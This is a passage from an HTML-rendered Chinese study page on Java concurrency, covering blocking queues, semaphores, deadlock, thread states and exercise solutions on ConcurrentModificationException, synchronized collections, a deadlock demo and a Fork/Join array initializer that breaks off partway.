<td>不存储元素的阻塞队列，每个插入操作必须等待一个移除操作，反之亦然</td>
</tr>
<tr>
<td><code>LinkedTransferQueue</code></td>
<td>一个由链表结构组成的无界阻塞队列</td>
</tr>
<tr>
<td><code>LinkedBlockingDeque</code></td>
<td>基于链表结构的可选有界双端阻塞队列</td>
</tr>
</tbody>
</table>
<h2 id="如何创建一个允许3个并行线程的信号量如何获取一个信号量如何释放一个信号量"><a class="markdownIt-Anchor" href="#如何创建一个允许3个并行线程的信号量如何获取一个信号量如何释放一个信号量"></a> 如何创建一个允许3个并行线程的信号量？如何获取一个信号量？如何释放一个信号量？</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 创建一个初始许可数为3的 Semaphore 实例。这表示最多允许3个线程同时持有许可。</span>
<span class="token class-name">Semaphore</span> semaphore <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Semaphore</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 当一个线程想要访问共享资源时，它必须先从信号量获取许可。如果信号量的计数大于零，线程将获得许可，并且信号量的计数将减少。如果计数为零，则当前线程将阻塞，直到另一个线程释放许可。</span>
semaphore<span class="token punctuation">.</span><span class="token function">acquire</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 或者，为了避免潜在的阻塞，可以使用：</span>
<span class="token keyword">boolean</span> success <span class="token operator">=</span> semaphore<span class="token punctuation">.</span><span class="token function">tryAcquire</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 这将立即返回，success 为 true 表示获取许可成功，为 false 表示获取失败。</span>

<span class="token comment">// 当线程完成对共享资源的访问后，它应该释放信号量。这会增加信号量的计数，并可能允许等待的其他线程获得许可</span>
semaphore<span class="token punctuation">.</span><span class="token function">release</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="锁和信号量之间的相似之处和不同之处在什么地方"><a class="markdownIt-Anchor" href="#锁和信号量之间的相似之处和不同之处在什么地方"></a> 锁和信号量之间的相似之处和不同之处在什么地方？</h2>
<h2 id="什么是死锁如何避免死锁"><a class="markdownIt-Anchor" href="#什么是死锁如何避免死锁"></a> 什么是死锁？如何避免死锁？</h2>
<p>死锁是指两个或多个线程在执行过程中，因为争夺资源而陷入相互等待的状态，导致它们都无法继续执行的现象。在死锁状态下，每个线程都在等待一个被其他线程持有的资源。</p>
<p>死锁通常涉及两种类型的资源：</p>
<ul>
<li>互斥资源：不能被多个线程同时使用的资源。</li>
<li>占有并等待：一个线程至少持有一个资源且等待获取额外的资源。<br>
死锁的四个必要条件：</li>
<li>互斥条件：至少有一个资源必须处于非共享模式，即一次只有一个线程能使用资源。</li>
<li>占有并等待：一个线程至少占有一个资源，并等待获取其他线程占有的资源。</li>
<li>不可抢占条件：资源只能由占有它们的线程自愿释放。</li>
<li>循环等待条件：存在一种线程资源的循环等待关系。<br>
避免死锁的策略：</li>
<li>打破互斥条件：尽可能设计算法和数据结构，使多个线程可以共享资源，从而避免互斥。</li>
<li>打破占有并等待：一次性分配所有资源，避免在持有其他资源的情况下等待额外资源。</li>
<li>打破不可抢占条件：允许线程抢占其他线程持有的资源。</li>
<li>打破循环等待条件：实施资源排序分配策略，强制每个线程以预定的顺序申请资源。<br>
实际操作建议：</li>
<li>资源分配顺序：定义资源的固定顺序，并按此顺序申请资源，避免循环等待。</li>
<li>使用锁超时：使用带超时的锁，避免线程永久持有锁。</li>
<li>死锁检测：定期检查和识别死锁，一旦检测到死锁，采取措施打破之。</li>
<li>减少资源占用：尽量减少每个线程所需资源的数量和持有时间，以降低发生死锁的风险。</li>
<li>使用并发控制工具：利用现代编程语言提供的高级并发控制工具，如 Java 中的 java.util.concurrent 包提供的锁。</li>
</ul>
<h2 id="什么是线程状态描述一个线程的状态"><a class="markdownIt-Anchor" href="#什么是线程状态描述一个线程的状态"></a> 什么是线程状态？描述一个线程的状态</h2>
<table>
<thead>
<tr>
<th>状态</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>NEW</code></td>
<td>线程刚被创建，但还没有调用 <code>start()</code> 方法。</td>
</tr>
<tr>
<td><code>RUNNABLE</code></td>
<td>线程正在 Java 虚拟机中执行，但它可能正在等待来自操作系统的资源（如处理器）。</td>
</tr>
<tr>
<td><code>BLOCKED</code></td>
<td>线程被阻塞，等待监视器锁定，以进入或重新进入同步块/方法。</td>
</tr>
<tr>
<td><code>WAITING</code></td>
<td>线程无限期等待其他线程来执行特定操作，例如 <code>Object.wait</code>、<code>Thread.join</code> 或 <code>LockSupport.park</code>。</td>
</tr>
<tr>
<td><code>TIMED_WAITING</code></td>
<td>线程在指定的最大时间内等待另一个线程来执行特定操作，例如 <code>Thread.sleep</code>、<code>Object.wait</code> 带超时、<code>Thread.join</code> 带超时或 <code>LockSupport.parkNanos</code>。</td>
</tr>
<tr>
<td><code>TERMINATED</code></td>
<td>线程已经执行完毕。</td>
</tr>
</tbody>
</table>
<h2 id="什么是同步合集arraylist是同步的吗如何使得其同步"><a class="markdownIt-Anchor" href="#什么是同步合集arraylist是同步的吗如何使得其同步"></a> 什么是同步合集？ArrayList是同步的吗？如何使得其同步？</h2>
<h2 id="演示concurrentmodificationexception异常选代器具有快速失效特性编写一个程序来演示该特性创建两个并发访问和修改集合的线程-第一个线程创建一个用数填充的散列集并每秒钟向该合集内添加一个新的数-第二个线程获取上述合集的一个迭代器并通过该迭代器每秒前后遍历一次合集-因为第二个线程遍历合集时第一个线程正在修改合集所以会得到一个concurrentmodificationexception异常"><a class="markdownIt-Anchor" href="#演示concurrentmodificationexception异常选代器具有快速失效特性编写一个程序来演示该特性创建两个并发访问和修改集合的线程-第一个线程创建一个用数填充的散列集并每秒钟向该合集内添加一个新的数-第二个线程获取上述合集的一个迭代器并通过该迭代器每秒前后遍历一次合集-因为第二个线程遍历合集时第一个线程正在修改合集所以会得到一个concurrentmodificationexception异常"></a> (演示ConcurrentModificationException异常)选代器具有快速失效特性，编写一个程序来演示该特性，创建两个并发访问和修改集合的线程。第一个线程创建一个用数填充的散列集并每秒钟向该合集内添加一个新的数。第二个线程获取上述合集的一个迭代器，并通过该迭代器每秒前后遍历一次合集。因为第二个线程遍历合集时，第一个线程正在修改合集，所以，会得到一个ConcurrentModificationException异常</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Collections</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashSet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Iterator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Set</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConcurrentModificationDemo</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> hashSet <span class="token operator">=</span> <span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">synchronizedSet</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 线程1：向集合中添加元素</span>
        <span class="token class-name">Thread</span> thread1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">try</span> <span class="token punctuation">{</span>
                    <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    hashSet<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>count<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Added: "</span> <span class="token operator">+</span> <span class="token punctuation">(</span>count <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">interrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 线程2：遍历集合</span>
        <span class="token class-name">Thread</span> thread2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token class-name">Iterator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> iterator <span class="token operator">=</span> hashSet<span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">while</span> <span class="token punctuation">(</span>iterator<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Reading: "</span> <span class="token operator">+</span> iterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">interrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ConcurrentModificationException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ConcurrentModificationException caught!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        thread1<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        thread2<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="使用同步合集使用同步解决前一个练习题中的问题使得第二个线程不抛出-concurrent-modificationexception-异常"><a class="markdownIt-Anchor" href="#使用同步合集使用同步解决前一个练习题中的问题使得第二个线程不抛出-concurrent-modificationexception-异常"></a> (使用同步合集)使用同步解决前一个练习题中的问题，使得第二个线程不抛出 Concurrent-ModificationException 异常</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashSet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Iterator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Set</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SynchronizedCollectionDemo</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> hashSet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 线程1：向集合中添加元素</span>
        <span class="token class-name">Thread</span> thread1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">try</span> <span class="token punctuation">{</span>
                    <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>hashSet<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        hashSet<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>count<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Added: "</span> <span class="token operator">+</span> <span class="token punctuation">(</span>count <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">interrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 线程2：同步遍历集合</span>
        <span class="token class-name">Thread</span> thread2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">try</span> <span class="token punctuation">{</span>
                    <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>hashSet<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token class-name">Iterator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> iterator <span class="token operator">=</span> hashSet<span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token keyword">while</span> <span class="token punctuation">(</span>iterator<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Reading: "</span> <span class="token operator">+</span> iterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">interrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        thread1<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        thread2<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="演示死锁编写一个演示死锁的程序"><a class="markdownIt-Anchor" href="#演示死锁编写一个演示死锁的程序"></a> (演示死锁)编写一个演示死锁的程序</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DeadlockDemo</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">final</span> <span class="token class-name">Object</span> resource1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> <span class="token class-name">Object</span> resource2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 线程1尝试先锁定资源1，然后资源2</span>
        <span class="token class-name">Thread</span> thread1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>resource1<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Thread 1: Locked resource 1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token keyword">try</span> <span class="token punctuation">{</span>
                    <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 让线程2有机会锁定资源2</span>
                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

                <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>resource2<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Thread 1: Locked resource 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 线程2尝试先锁定资源2，然后资源1</span>
        <span class="token class-name">Thread</span> thread2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>resource2<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Thread 2: Locked resource 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token keyword">try</span> <span class="token punctuation">{</span>
                    <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 让线程1有机会锁定资源1</span>
                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

                <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>resource1<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Thread 2: Locked resource 1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        thread1<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        thread2<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="并行数组初始化器使用-forkjoin-框架实现下面的方法可以设置随机值给线性表-public-static-void-parallelassignvaluesdouble-list编写一个测试程序创建一个具有9000-000个元素的线性表调用-paralleassignvalues来赋随机值给线性表-另外实现一个顺序算法并且比较两种方法执行的时间-注意如果使用mathrandom并行代码的执行时间将比顺序代码的执行时间差因为-mathrandom是同步的不能并行执行-为了解决这个问题创建一个-random-对象用于赋随机值给一个小的线性表"><a class="markdownIt-Anchor" href="#并行数组初始化器使用-forkjoin-框架实现下面的方法可以设置随机值给线性表-public-static-void-parallelassignvaluesdouble-list编写一个测试程序创建一个具有9000-000个元素的线性表调用-paralleassignvalues来赋随机值给线性表-另外实现一个顺序算法并且比较两种方法执行的时间-注意如果使用mathrandom并行代码的执行时间将比顺序代码的执行时间差因为-mathrandom是同步的不能并行执行-为了解决这个问题创建一个-random-对象用于赋随机值给一个小的线性表"></a> (并行数组初始化器)使用 Fork/Join 框架实现下面的方法，可以设置随机值给线性表。public static void parallelAssignValues(double[] list)编写一个测试程序，创建一个具有9000 000个元素的线性表，调用 paralleAssignValues来赋随机值给线性表。另外实现一个顺序算法，并且比较两种方法执行的时间。注意，如果使用Math.random()，并行代码的执行时间将比顺序代码的执行时间差，因为 Math.random()是同步的，不能并行执行。为了解决这个问题，创建一个 Random 对象，用于赋随机值给一个小的线性表</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">RecursiveAction</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">ForkJoinPool</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">ThreadLocalRandom</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ParallelArrayInitializer</span> <span class="token punctuation">{</span>

    <span class="token comment">// 继承 RecursiveAction 来创建可以用于 Fork/Join 框架的任务</span>
    <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">AssignTask</span> <span class="token keyword">extends</span> <span class="token class-name">RecursiveAction</span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">double</span><span class="token punctuation">[</span><span class="token punctuation">]</span> array<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> start<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> end<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token constant">THRESHOLD</span> <span class="token operator">=</span> <span class="token number">10000</span><span class="token punctuation">;</span> <span class="token comment">// 分割阈值</span>

        <span class="token class-name">AssignTask</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">[</span><span class="token punctuation">]</span> array<span class="token punctuation">,</span> <span class="token keyword">int</span> start<span class="token punctuation">,</span> <span class="token keyword">int</span> end<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>array <span class="token operator">=</span> array<span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>start <span class="token operator">=</span> start<span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>end <span class="token operator">=</span> end<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token annotation punctuation">@Override</span>
